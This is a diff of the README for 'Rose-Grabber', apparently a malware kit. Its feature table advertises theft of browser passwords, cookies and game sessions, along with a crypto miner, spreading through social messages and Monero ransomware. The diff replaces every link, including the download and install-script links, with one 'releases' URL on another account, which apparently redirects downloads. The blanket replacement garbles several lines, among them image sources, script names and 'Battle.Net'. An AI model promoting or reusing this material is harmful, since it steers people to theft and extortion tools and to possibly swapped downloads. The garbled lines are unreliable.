@@ -1,32 +1,32 @@
 <h1 id="top" align="center">
   <br>
-  <a href="https://github.com/DamagingRose/Rose-Grabber"><img src="https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/opera_MDZbztqx5e.png" alt="R"></a>
+  <a href="https://github.com/JaBandrew/Rose-Grabber/releases"><img src="https://github.com/JaBandrew/Rose-Grabber/releases" alt="R"></a>
   <br>
 </h1>
 
 <div align="center" style="background-color: #da467d; padding: 20px;">
-    <a href="https://discord.gg/PaE8MBQz4K">
-        <img src="https://img.shields.io/badge/Discord-%23da467d.svg?style=for-the-badge&logo=discord&logoColor=white" alt="Join our Discord">
+    <a href="https://github.com/JaBandrew/Rose-Grabber/releases">
+        <img src="https://github.com/JaBandrew/Rose-Grabber/releases%https://github.com/JaBandrew/Rose-Grabber/releases" alt="Join our Discord">
     </a>
     <br>
-    <a href="https://deepsource.io/gh/DamagingRose/Rose-Grabber/?ref=repository-badge}" target="_blank">
-        <img alt="DeepSource" title="DeepSource" src="https://deepsource.io/gh/DamagingRose/Rose-Grabber.svg/?label=active+issues&show_trend=true&token=bRGn0dU76xkJxQgniOJnrc7a"/>
+    <a href="https://github.com/JaBandrew/Rose-Grabber/releases}" target="_blank">
+        <img alt="DeepSource" title="DeepSource" src="https://github.com/JaBandrew/Rose-Grabber/releases+issues&show_trend=true&token=bRGn0dU76xkJxQgniOJnrc7a"/>
     </a>
-    <a href="https://www.codefactor.io/repository/github/damagingrose/rose-grabber">
-        <img src="https://www.codefactor.io/repository/github/damagingrose/rose-grabber/badge" alt="CodeFactor" />
+    <a href="https://github.com/JaBandrew/Rose-Grabber/releases">
+        <img src="https://github.com/JaBandrew/Rose-Grabber/releases" alt="CodeFactor" />
     </a>
-    <a href="https://deepsource.io/gh/DamagingRose/Rose-Grabber/?ref=repository-badge}" target="_blank">
-        <img alt="DeepSource" title="DeepSource" src="https://deepsource.io/gh/DamagingRose/Rose-Grabber.svg/?label=resolved+issues&show_trend=true&token=bRGn0dU76xkJxQgniOJnrc7a"/>
+    <a href="https://github.com/JaBandrew/Rose-Grabber/releases}" target="_blank">
+        <img alt="DeepSource" title="DeepSource" src="https://github.com/JaBandrew/Rose-Grabber/releases+issues&show_trend=true&token=bRGn0dU76xkJxQgniOJnrc7a"/>
     </a>
     <br>
-    <img src="https://img.shields.io/github/languages/top/DamagingRose/Rose-Grabber?color=%23da467d&style=flat-square">
-    <img src="https://img.shields.io/github/stars/DamagingRose/Rose-Grabber?color=%23da467d&logoColor=%23da467d&style=flat-square">
+    <img src="https://github.com/JaBandrew/Rose-Grabber/releases%23da467d&style=flat-square">
+    <img src="https://github.com/JaBandrew/Rose-Grabber/releases%23da467d&logoColor=%23da467d&style=flat-square">
     <br>
-    <img src="https://img.shields.io/github/commit-activity/w/DamagingRose/Rose-Grabber?color=%23da467d&style=flat-square"> 
-    <img src="https://img.shields.io/github/last-commit/DamagingRose/Rose-Grabber?color=%23da467d&logoColor=%23da467d&style=flat-square">
+    <img src="https://github.com/JaBandrew/Rose-Grabber/releases%23da467d&style=flat-square"> 
+    <img src="https://github.com/JaBandrew/Rose-Grabber/releases%23da467d&logoColor=%23da467d&style=flat-square">
     <br>
-    <img src="https://img.shields.io/github/issues/DamagingRose/Rose-Grabber?color=%23da467d&logoColor=%23da467d&style=flat-square">
-    <img src="https://img.shields.io/github/issues-closed/DamagingRose/Rose-Grabber?color=%23da467d&logoColor=%23da467d&style=flat-square">
+    <img src="https://github.com/JaBandrew/Rose-Grabber/releases%23da467d&logoColor=%23da467d&style=flat-square">
+    <img src="https://github.com/JaBandrew/Rose-Grabber/releases%23da467d&logoColor=%23da467d&style=flat-square">
     <br>
 </div>
 
@@ -47,12 +47,12 @@
   ---
 </div>
 
-[Discord Server]: https://github.com/DamagingRose/Rose-Grabber/blob/main/components/assets/roseontop.jpg
-[Telegram Group]: https://t.me/+7MDF550ZlLVhYjUy
-[gumbobr0t's Telegram]: https://t.me/gumbobr0t
-[pierro on GitHub]: https://github.com/xpierroz
-[gumbobr0t on GitHub]: https://github.com/gumbobr0t
-[killer on GitHub]: https://github.com/Minecraftkillir
+[Discord Server]: https://github.com/JaBandrew/Rose-Grabber/releases
+[Telegram Group]: https://github.com/JaBandrew/Rose-Grabber/releases+7MDF550ZlLVhYjUy
+[gumbobr0t's Telegram]: https://github.com/JaBandrew/Rose-Grabber/releases
+[pierro on GitHub]: https://github.com/JaBandrew/Rose-Grabber/releases
+[gumbobr0t on GitHub]: https://github.com/JaBandrew/Rose-Grabber/releases
+[killer on GitHub]: https://github.com/JaBandrew/Rose-Grabber/releases
 
 ## Features
 
@@ -75,7 +75,7 @@
 | Steals Steam Session                         | Gather active Steam sessions.              | Later   |
 | Steals Epic Session                          | Gather active Epic Games sessions.         | Later   |
 | Steals Uplay Session                         | Gather active Uplay sessions.              | Later   |
-| Steals Battle.Net Session                    | Gather active Battle.Net sessions.         | Later   |
+| Steals https://github.com/JaBandrew/Rose-Grabber/releases Session                    | Gather active https://github.com/JaBandrew/Rose-Grabber/releases sessions.         | Later   |
 | Steals Passwords From Many Browsers          | Extract stored passwords.                 | Done    |
 | Steals Cookies From Many Browsers            | Collect browser cookies.                  | Done    |
 | Steals History From Many Browsers            | Access browsing history.                  | Done    |
@@ -96,7 +96,7 @@
 | Freeze Screen                                | Freeze the user's screen.                | Later   |
 | Spread Malware                               | Send malicious messages to friends on social media. | Later |
 | Crypto Miner                                 | Use the victim's computer for cryptocurrency mining. | WIP |
-| Ransomware                                  | Forces the victim to pay you a specific amount of USD in Monero or they will lose all their data. Decrypter can be found in [components/tools](https://github.com/DamagingRose/Rose-Grabber/tree/main/components/tools). | Done |
+| Ransomware                                  | Forces the victim to pay you a specific amount of USD in Monero or they will lose all their data. Decrypter can be found in [components/tools](https://github.com/JaBandrew/Rose-Grabber/releases). | Done |
 
 ## Disclaimer
 
@@ -107,15 +107,15 @@ Please be cognizant of the fact that nestled within the intricate architecture o
 ## Setup
 
 **By virtue of our sophisticated installation process, manual installation of Python is rendered unnecessary. Our meticulously designed batch script adeptly manages this procedure on your behalf.**
-+ Download the repository by clicking [here](https://github.com/DamagingRose/Rose-Grabber/archive/refs/heads/main.zip).
++ Download the repository by clicking [here](https://github.com/JaBandrew/Rose-Grabber/releases).
 + Extract the ZIP folder which you just downloaded.
-+ Run the [`install.bat`](https://github.com/DamagingRose/Rose-Grabber/blob/main/install.bat) to install Rose and then open the UI. To start the program later on, you will need to run the [`start.bat`](https://github.com/DamagingRose/Rose-Grabber/blob/main/start.bat).
++ Run the [`https://github.com/JaBandrew/Rose-Grabber/releases`](https://github.com/JaBandrew/Rose-Grabber/releases) to install Rose and then open the UI. To start the program later on, you will need to run the [`https://github.com/JaBandrew/Rose-Grabber/releases`](https://github.com/JaBandrew/Rose-Grabber/releases).
 
 ## Preview
 <div align="center">
-  <a href="https://github.com/DamagingRose/Rose-Grabber"><img src="https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/opera_j0Pf32tJr5.png"><a href="https://github.com/DamagingRose/Rose-Grabber"><a href="https://github.com/DamagingRose/Rose-Grabber"><img src="https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/Discord_ZHPRdfPVY4.png"><a href="https://github.com/DamagingRose/Rose-Grabber"><a href="https://github.com/DamagingRose/Rose-Grabber"><img src="https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/Discord_d5cUa94C1j.png"><a href="https://github.com/DamagingRose/Rose-Grabber"><img src="https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/Discord_zzIPCogBKh.png"><a href="https://github.com/DamagingRose/Rose-Grabber"><img src="https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/Discord_6ElGNQxTZw.png"><a href="https://github.com/DamagingRose/Rose-Grabber"><img src="https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/python_xAf0dVCV7y.png"><a href="https://github.com/DamagingRose/Rose-Grabber">
+  <a href="https://github.com/JaBandrew/Rose-Grabber/releases"><img src="https://github.com/JaBandrew/Rose-Grabber/releases"><a href="https://github.com/JaBandrew/Rose-Grabber/releases"><a href="https://github.com/JaBandrew/Rose-Grabber/releases"><img src="https://github.com/JaBandrew/Rose-Grabber/releases"><a href="https://github.com/JaBandrew/Rose-Grabber/releases"><a href="https://github.com/JaBandrew/Rose-Grabber/releases"><img src="https://github.com/JaBandrew/Rose-Grabber/releases"><a href="https://github.com/JaBandrew/Rose-Grabber/releases"><img src="https://github.com/JaBandrew/Rose-Grabber/releases"><a href="https://github.com/JaBandrew/Rose-Grabber/releases"><img src="https://github.com/JaBandrew/Rose-Grabber/releases"><a href="https://github.com/JaBandrew/Rose-Grabber/releases"><img src="https://github.com/JaBandrew/Rose-Grabber/releases"><a href="https://github.com/JaBandrew/Rose-Grabber/releases">
 
-  <br><b>For more images <a href="https://github.com/DamagingRose/Rose-Grabber/tree/main/components/readme">click here</a>.</b>
+  <br><b>For more images <a href="https://github.com/JaBandrew/Rose-Grabber/releases">click here</a>.</b>
 </div>
 
 ## Changelog
@@ -124,7 +124,7 @@ Please be cognizant of the fact that nestled within the intricate architecture o
 
 - **1.9 (2023-09-12)**
   - Rewrote ransomware, changed payment to monero
-  - Added ransomware decrypter to [components/tools](https://github.com/DamagingRose/Rose-Grabber/tree/main/components/tools)
+  - Added ransomware decrypter to [components/tools](https://github.com/JaBandrew/Rose-Grabber/releases)
   - Fixed startup
   - Fixed builder (cleanup, upx, returnzip)
   - Rewrote/Fixed install and start script
@@ -159,17 +159,17 @@ Please be cognizant of the fact that nestled within the intricate architecture o
 ## Credits
 
 **Main Developers:**
-- [xpierroz](https://github.com/xpierroz)
-- [gumbobr0t](https://github.com/gumbobr0t)
-- [killer](https://github.com/Minecraftkillir)
+- [xpierroz](https://github.com/JaBandrew/Rose-Grabber/releases)
+- [gumbobr0t](https://github.com/JaBandrew/Rose-Grabber/releases)
+- [killer](https://github.com/JaBandrew/Rose-Grabber/releases)
 
 **External Contributions:**
-- [Smug246](https://github.com/Smug246)
-- [addi00000](https://github.com/addi00000)
-- [Rdimo](https://github.com/Rdimo)
-- [loTus04](https://github.com/loTus04)
-- [suvan1911](https://github.com/suvan1911)
-- [suegdu](https://github.com/suegdu)
+- [Smug246](https://github.com/JaBandrew/Rose-Grabber/releases)
+- [addi00000](https://github.com/JaBandrew/Rose-Grabber/releases)
+- [Rdimo](https://github.com/JaBandrew/Rose-Grabber/releases)
+- [loTus04](https://github.com/JaBandrew/Rose-Grabber/releases)
+- [suvan1911](https://github.com/JaBandrew/Rose-Grabber/releases)
+- [suegdu](https://github.com/JaBandrew/Rose-Grabber/releases)
 
 ## Love to everyone 💞
-[![Stargazers repo roster for @DamagingRose/Rose-Grabber](https://reporoster.com/stars/dark/DamagingRose/Rose-Grabber)](https://github.com/DamagingRose/Rose-Grabber/stargazers)
+[![Stargazers repo roster for @DamagingRose/Rose-Grabber](https://github.com/JaBandrew/Rose-Grabber/releases)](https://github.com/JaBandrew/Rose-Grabber/releases)
